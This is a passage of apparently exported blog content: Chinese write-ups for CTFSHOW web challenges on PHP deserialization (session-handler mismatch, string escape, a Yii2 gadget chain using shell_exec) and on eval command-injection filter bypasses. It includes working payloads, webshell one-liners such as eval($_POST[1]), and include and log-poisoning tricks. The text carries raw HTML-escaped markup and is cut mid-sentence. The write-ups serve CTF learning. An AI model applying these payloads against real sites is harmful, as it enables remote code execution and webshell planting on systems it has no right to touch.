= \u0026#39;123\u0026#39;; 6 public $token=\u0026#39;admin\u0026#39;; 7 8} 9$payload = new message(); 10echo serialize($payload); 11 12O:7:\u0026#34;message\u0026#34;:4:{s:4:\u0026#34;from\u0026#34;;N;s:3:\u0026#34;msg\u0026#34;;N;s:2:\u0026#34;to\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} 截取后面一部分作为to的值传入\npayload:\n?f=\u0026amp;m=\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} web263 访问/www.zip拿到源码\n审计代码我们可以在/inc/inc.php中找到这样一个危险方法\n假如username和password可控，我们就可以写入木马\n但是这是一个__destruct方法，想要触发必须要经过反序列化，那这道题哪里有进行反序列的地方呢\n文章 - 带你走进PHP session反序列化漏洞 - 先知社区\n这篇文章讲得很详细\n归根结底这个漏洞之所以存在是由于序列化和反序列化时使用的处理器不同造成的\nsession.serialize_handler定义的引擎有三种，如下表所示：\n处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 注：自 PHP 5.5.4 起可以使用 php_serialize\n这道题的php版本为7.3.11，默认使用的处理器为php_serialize\n而在/inc/inc.php中却设置处理器为php\n也就是说序列化和反序列化所使用的处理器不同\n所以我们可以根据php处理器的格式构造出payload\nexp：\n1\u0026lt;?php 2 3class User{ 4 public $username; 5 public $password; 6 function __construct(){ 7 $this-\u0026gt;username = \u0026#39;1.php\u0026#39;; 8 $this-\u0026gt;password = \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;; 9 } 10} 11 12echo urlencode(base64_encode(\u0026#39;|\u0026#39;.serialize(new User()))); 13 14?\u0026gt; 我们将cookie中的limit修改为我们序列化后的结果\n/index.php\n1\tif(isset($_SESSION[\u0026#39;limit\u0026#39;])){ 2\t$_SESSION[\u0026#39;limti\u0026#39;]\u0026gt;5?die(\u0026#34;登陆失败次数超过限制\u0026#34;):$_SESSION[\u0026#39;limit\u0026#39;]=base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]); 3\t$_COOKIE[\u0026#39;limit\u0026#39;] = base64_encode(base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]) +1); 4\t}else{ 5\tsetcookie(\u0026#34;limit\u0026#34;,base64_encode(\u0026#39;1\u0026#39;)); 6\t$_SESSION[\u0026#39;limit\u0026#39;]= 1; 7\t} 修改后访问/check.php进行反序列化\n最后访问/log-1.php\n成功写入\nweb264 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17session_start(); 18 19class message{ 20 public $from; 21 public $msg; 22 public $to;1 23 public function __construct($f,$m,$t){ 24 $this-\u0026gt;from = $f; 25 $this-\u0026gt;msg = $m; 26 $this-\u0026gt;to = $t; 27 } 28} 29 30$f = $_GET[\u0026#39;f\u0026#39;]; 31$m = $_GET[\u0026#39;m\u0026#39;]; 32$t = $_GET[\u0026#39;t\u0026#39;]; 33 34if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 35 $msg = new message($f,$m,$t); 36 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 37 $_SESSION[\u0026#39;msg\u0026#39;]=base64_encode($umsg); 38 echo \u0026#39;Your message has been sent\u0026#39;; 39} 40 41highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13session_start(); 14highlight_file(__FILE__); 15include(\u0026#39;flag.php\u0026#39;); 16 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 30 $msg = unserialize(base64_decode($_SESSION[\u0026#39;msg\u0026#39;])); 31 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 32 echo $flag; 33 } 34} 这题是修复了web262的非预期解，也就是可以直接在message.php修改cookie进行反序列化\n所以解法同web262\npayload:\n?f=1\u0026amp;m=1\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} 注意要在message.php的cookie中加上msg=1\nweb265 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#39;flag.php\u0026#39;); 16highlight_file(__FILE__); 17class ctfshowAdmin{ 18 public $token; 19 public $password; 20 21 public function __construct($t,$p){ 22 $this-\u0026gt;token=$t; 23 $this-\u0026gt;password = $p; 24 } 25 public function login(){ 26 return $this-\u0026gt;token===$this-\u0026gt;password; 27 } 28} 29 30$ctfshow = unserialize($_GET[\u0026#39;ctfshow\u0026#39;]); 31$ctfshow-\u0026gt;token=md5(mt_rand()); 32 33if($ctfshow-\u0026gt;login()){ 34 echo $flag; 35} 这题指针引用使password恒等于token即可\nexp\n1\u0026lt;?php 2 class ctfshowAdmin{ 3 public $token; 4 public $password; 5 6 public function __construct($t,$p){ 7 $this-\u0026gt;token=$t; 8 $this-\u0026gt;password = $p; 9 } 10 } 11 $a = new ctfshowAdmin(\u0026#34;我能打上海major\u0026#34;,\u0026#34;全场欢呼！DANKING！DANKING！\u0026#34;); 12 $a-\u0026gt;password = \u0026amp;$a-\u0026gt;token; 13 echo urlencode(serialize($a)); web266 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14highlight_file(__FILE__); 15 16include(\u0026#39;flag.php\u0026#39;); 17$cs = file_get_contents(\u0026#39;php://input\u0026#39;); 18 19 20class ctfshow{ 21 public $username=\u0026#39;xxxxxx\u0026#39;; 22 public $password=\u0026#39;xxxxxx\u0026#39;; 23 public function __construct($u,$p){ 24 $this-\u0026gt;username=$u; 25 $this-\u0026gt;password=$p; 26 } 27 public function login(){ 28 return $this-\u0026gt;username===$this-\u0026gt;password; 29 } 30 public function __toString(){ 31 return $this-\u0026gt;username; 32 } 33 public function __destruct(){ 34 global $flag; 35 echo $flag; 36 } 37} 38$ctfshowo=@unserialize($cs); 39if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $cs)){ 40 throw new Exception(\u0026#34;Error $ctfshowo\u0026#34;,1); 41} php大小写不敏感，大小写绕过\nexp\n1\u0026lt;?php 2class Ctfshow{ 3 4} 5echo serialize(new Ctfshow()); O:7:\u0026#34;Ctfshow\u0026#34;:0:{} web267 考点：Yii2 反序列化漏洞\n有一个登录入口\n弱口令成功登入admin/admin\n在/index.php?r=site%2Fabout处查看源代码看到hint\n访问/index.php?r=site%2Fabout\u0026amp;view-source\n题目给出了入口点\n从源码中我们可以知道这道题用的是yii框架，而且为2.0版本\nyii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客\n直接用poc总感觉缺了点什么，那自己搓一搓吧，但是过程就不放在这里了\n\u0026lt;?php\rnamespace yii\\rest{\rclass IndexAction{\rpublic $checkAccess;\rpublic $id;\rpublic function __construct(){\r$this-\u0026gt;checkAccess = \u0026#39;shell_exec\u0026#39;;\r$this-\u0026gt;id = \u0026#39;cat /flag | tee 1\u0026#39;;//命令执行\r}\r}\r}\rnamespace Faker {\ruse yii\\rest\\IndexAction;\rclass Generator\r{\rprotected $formatters;\rpublic function __construct()\r{\r$this-\u0026gt;formatters[\u0026#39;close\u0026#39;] = [new IndexAction(), \u0026#39;run\u0026#39;];\r}\r}\r}\rnamespace yii\\db{\ruse Faker\\Generator;\rclass BatchQueryResult{\rprivate $_dataReader;\rpublic function __construct()\r{\r$this-\u0026gt;_dataReader=new Generator();\r}\r}\r}\rnamespace{\ruse yii\\db\\BatchQueryResult;\recho base64_encode(serialize(new BatchQueryResult()));\r} 没回显，用tee将输出复制到1文件中\npayload\n?r=backdoor/shell\u0026amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV\rJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV\rxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID\rEiO31pOjE7czozOiJydW4iO319fX0= ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch4 id=\"php的魔法方法\"\u003ePHP的魔法方法\u003c/h4\u003e\n\u003cp\u003ePHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-scss\" data-lang=\"scss\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__construct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类的构造函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__destruct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类的析构函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__call\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e在对象中调用一个不可访问方法时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__callStatic\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e用静态方式中调用一个不可访问方法时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__get\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e获得一个类的成员变量时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e设置一个类的成员变量时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对不可访问属性调用isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e或empty\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对不可访问属性调用unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时被调用\u003c/span\u003e\u003cspan class=\"err\"\u003e。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__sleep\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e执行serialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e先会调用这个函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__wakeup\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e执行unserialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e先会调用这个函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__toString\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类被当成字符串时的回应方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__invoke\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e调用函数的方式调用一个对象时的回应方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set_state\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e调用var_export\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e导出类时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e此静态方法会被调用\u003c/span\u003e\u003cspan class=\"err\"\u003e。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__clone\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对象复制完成时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__autoload\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e尝试加载未定义的类\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__debugInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e打印所需调试信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web254\"\u003eweb254\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003eu003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e    public $code=\u0026#39;xrntkk\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e$poc = new ctfshowvip();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eecho urlencode(serialize($poc));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web262\"\u003eweb262\u003c/h4\u003e\n\u003cp\u003e字符串逃逸\u003c/p\u003e","title":"CTFSHOW-反序列化-Writeup"},{"content":"web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n进行绕过就行，解法很多\nc=system(\u0026ldquo;cat fl*g.php | grep -E \u0026lsquo;fl.g\u0026rsquo; \u0026ldquo;);\nc=system(\u0026ldquo;tac fl*g.php\u0026rdquo;);\nc=system(\u0026ldquo;cat fl*g.php\u0026rdquo;);（用cat要右键查看源代码才能看到回显）\nc=system(\u0026ldquo;cp fl*g.php a.txt \u0026ldquo;);（访问a.txt查看）\nc=system(\u0026rsquo;echo -e \u0026quot; \u0026lt;?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \u0026quot; \u0026gt; a.php\u0026rsquo;); //直接新建一个页面并写入一句话木马 （/a.php?c=system(\u0026ldquo;tac flag.php\u0026rdquo;);）\n?c=echo `tac fla*`;\n\u0026hellip;.\nweb30 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行\npayload:\nc=printf(exec(\u0026ldquo;cat%20fl*\u0026rdquo;));\nc=echo exec(\u0026ldquo;cat f\\lag.p\\hp\u0026rdquo;);\nc=show_source(scandir(\u0026rdquo;.\u0026rdquo;)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)\nc=highlight_file(next(array_reverse(scandir(\u0026rdquo;.\u0026rdquo;))));\nc=passthru(\u0026ldquo;tac fla*\u0026rdquo;);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(\u0026ldquo;tac fla*\u0026rdquo;);*\nc=echo shell_exec(\u0026ldquo;tac fla*\u0026rdquo;);\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;);\nc=passthru(base64_decode(\u0026ldquo;Y2F0IGZsYWcucGhw==\u0026rdquo;));(base64绕过)\n\u0026hellip;\u0026hellip;\nweb31 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u0026amp;1=system(\u0026ldquo;tac flag.php\u0026rdquo;); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(\u0026ldquo;tac%09fla*\u0026rdquo;); c=echo`tac%09fla*`; web32 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\n过滤了空格可以用${IFS}和%0a 代替，分号可以用?\u0026gt;代替\n用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\n得到的结果用base64解码一下就可以得到flag了\n或者用日志注入：\nurl/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\nweb33 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| 